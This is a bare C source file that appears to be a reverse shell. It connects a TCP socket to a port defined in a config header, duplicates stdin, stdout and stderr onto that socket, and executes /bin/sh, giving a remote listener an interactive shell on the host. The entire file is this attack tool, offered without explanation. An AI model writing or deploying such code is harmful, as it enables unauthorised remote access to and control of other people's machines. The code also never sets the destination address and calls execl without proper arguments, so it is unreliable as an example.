#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "includes/config.h"

int main(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in sock_addr;
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(SERVER_PORT);
    connect(sock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr_in));

    dup2(sock, STDIN_FILENO);

    dup2(sock, STDOUT_FILENO);

    dup2(sock, STDERR_FILENO);

    execl("/bin/sh", NULL);
    return EXIT_SUCCESS;
}